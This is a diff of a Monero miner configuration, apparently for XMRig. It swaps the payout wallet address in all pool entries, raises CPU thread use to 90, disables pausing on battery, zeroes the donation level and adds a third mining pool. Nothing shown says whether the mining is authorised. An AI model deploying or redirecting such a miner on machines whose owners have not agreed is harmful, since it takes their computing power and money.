@@ -1,22 +1,32 @@
 {
   "autosave": true,
   "cpu": true,
-  "cpu-max-threads-hint": 50,
+  "cpu-max-threads-hint": 90,
+  "pause-on-battery": false,
+  "donate-level": 0,
   "pools": [
     {
-      "url": "auto.c3pool.org:19999",
-      "user": "48wqKep8F42VfTrGMyjTTWcbepzBtNsMVa5xroxZuUS981Pjn1ExTRnNvbsyTfrgsFHUzo9hcPKFZYhsDrhAaHesE7yj6yW",
+      "url": "pool.supportxmr.com:443",
+      "user": "42awGhESvf7i6A2J3k8JZjZjndN2vptGggp1Y77onCxub4mwSYCcHjKEuGJ71eb5dSGFd5iwaXRueEEPDmpbiY954gQ8b6L",
       "pass": "x",
-      "rig-id": "cpu50f18ffe",
-      "keepalive": true
+      "tls": true,
+      "keepalive": true,
+      "rig-id": "cpuefc30fba"
     },
     {
-      "url": "pool.supportxmr.com:443",
-      "user": "48wqKep8F42VfTrGMyjTTWcbepzBtNsMVa5xroxZuUS981Pjn1ExTRnNvbsyTfrgsFHUzo9hcPKFZYhsDrhAaHesE7yj6yW",
+      "url": "gulf.moneroocean.stream:10128",
+      "user": "42awGhESvf7i6A2J3k8JZjZjndN2vptGggp1Y77onCxub4mwSYCcHjKEuGJ71eb5dSGFd5iwaXRueEEPDmpbiY954gQ8b6L",
       "pass": "x",
-      "rig-id": "cpu50f18ffe",
+      "tls": false,
       "keepalive": true,
-      "tls": true
+      "rig-id": "cpuefc30fba"
+    },
+    {
+      "url": "auto.c3pool.org:19999",
+      "user": "42awGhESvf7i6A2J3k8JZjZjndN2vptGggp1Y77onCxub4mwSYCcHjKEuGJ71eb5dSGFd5iwaXRueEEPDmpbiY954gQ8b6L",
+      "pass": "x",
+      "keepalive": true,
+      "rig-id": "cpuefc30fba"
     }
   ]
 }
